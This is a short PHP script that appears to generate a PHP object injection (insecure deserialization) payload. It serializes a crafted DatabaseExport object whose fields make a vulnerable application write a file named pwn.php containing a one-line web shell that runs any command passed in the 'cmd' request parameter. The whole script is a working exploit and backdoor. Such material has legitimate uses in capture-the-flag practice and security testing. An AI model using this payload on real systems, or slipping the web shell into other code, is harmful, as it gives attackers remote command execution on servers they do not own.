<?php

class DatabaseExport
{
	public $user_file = 'pwn.php';
	public $data = '<?php system($_REQUEST["cmd"]); ?>' ;

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}
}

$exp = new DatabaseExport;
echo(serialize($exp));

?>